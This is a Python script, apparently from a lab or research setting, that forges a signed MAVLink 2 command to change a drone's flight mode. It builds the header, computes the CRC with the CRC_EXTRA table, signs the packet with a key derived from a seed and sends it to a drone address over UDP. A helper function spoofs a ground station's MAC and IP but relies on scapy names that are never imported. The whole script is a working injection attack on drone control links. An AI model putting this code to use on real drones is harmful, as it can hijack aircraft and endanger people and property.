from pymavlink import mavutil
import time
import hashlib
import struct

def send_fake_mavlink_msg(fake_msg):
    ether = Ether(src=fake_gcs_mac, dst="08:00:27:9e:65:fa")
    ip = IP(src=fake_gcs_ip, dst=drone_ip)
    udp = UDP(sport=14551, dport=drone_port) # UDP端口
    pkt = ether / ip / udp / fake_msg
    sendp(pkt, iface="enp0s3") # 网卡接口
    return pkt


def crc_accumulate(byte, crc):
    tmp = byte ^ (crc & 0xff)
    tmp ^= (tmp << 4) & 0xff
    return ((crc >> 8) & 0xff) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)

def crc_calculate(bytes, length):
    crc = 0xffff
    for i in range(length):
        crc = crc_accumulate(bytes[i], crc)
    return crc

# 用户输入
seed = input("Enter seed: ")
secreteKey = hashlib.sha256(seed.encode('utf-8')).hexdigest()
linkid = input("Enter linkid (in hex format): ")

def build_message():
    target_system = 1
    target_component = 1
    # 创建 MAVLink 消息
    command = mavutil.mavlink.MAVLink_command_long_message(
        target_system=target_system,
        target_component=target_component,
        command=mavutil.mavlink.MAV_CMD_DO_SET_MODE,
        confirmation=0,
        param1=1.0, param2=6.0, param3=0, 
        param4=0, param5=0, param6=0, param7=0
    )
    return command

# 构建消息
command_message = build_message()

# pack the message with only payload
packed_message = command_message.pack(mavutil.mavlink.MAVLink('', 1))
payload = packed_message[6:-2]  

message_id = command_message.get_msgId()
payload_length = len(payload)

# 创建 MAVLink 2 消息头
header = bytearray()
header.extend(bytearray([0xFD]))  # STX (Start of Text)
header.extend(payload_length.to_bytes(1, 'little'))  # Payload length
header.extend(bytearray([1]))
header.extend(bytearray([0])) 
header.extend(bytearray([255]))  # Sequence number
header.extend(bytearray([255])) 
header.extend(bytearray([190])) 
header.extend(message_id.to_bytes(3, 'little')) 

# CRC
# CRC_EXTRA value table
crc_extra_list = [50, 124, 137, 0, 237, 217, 104, 119, 0, 0, 0, 89, 0, 0, 0, 0, 0, 0, 0, 0, 214, 159, 220, 168, 24, 23, 170, 144,
67, 115, 39, 246, 185, 104, 237, 244, 222, 212, 9, 254, 230, 28, 28, 132, 221, 232, 11, 153, 41, 39, 214, 223,
141, 33, 15, 3, 100, 24, 239, 238, 30, 200, 183, 0, 130, 0, 148, 21, 0, 52, 124, 0, 0, 0, 20, 0, 152, 143, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 231, 183, 63, 54, 0, 0, 0, 0, 0, 0, 0, 175, 102, 158, 208, 56, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 204, 49, 170, 44, 83, 46, 0]

message_with_header = header[1:] + payload # header not include STX
crc = crc_calculate(message_with_header, len(message_with_header))
crc_extra = crc_extra_list[message_id]

# CRC_EXTRA --> final CRC
crc = crc_accumulate(crc_extra, crc)

crc_hex = crc.to_bytes(2, 'little').hex()

currentTime = int(time.time() * 1e6)
timestamp = currentTime.to_bytes(8, 'little')[-6:]  # 截取低 6 字节
timestamp_hex = timestamp.hex()

header_hex = header.hex()
payload_hex = payload.hex()

# 生成签名输入的十六进制字符串形式
signature_input_hex = secreteKey + header_hex + payload_hex + crc_hex + linkid + timestamp_hex

# 将十六进制字符串转换为字节
signature_input_bytes = bytes.fromhex(signature_input_hex)

# 生成签名
hash_result = hashlib.sha256(signature_input_bytes).digest()
signature = hash_result[:6]

# 组合最终的消息
signed_msg = header + payload + bytes.fromhex(crc_hex) + bytes.fromhex(linkid) + timestamp + signature

# send message
try:
    master = mavutil.mavlink_connection('udpout:10.0.2.5:14551')
    master.wait_heartbeat()
    master.write(signed_msg)
    print("message sent")
except Exception as e:
    print("error:", str(e))
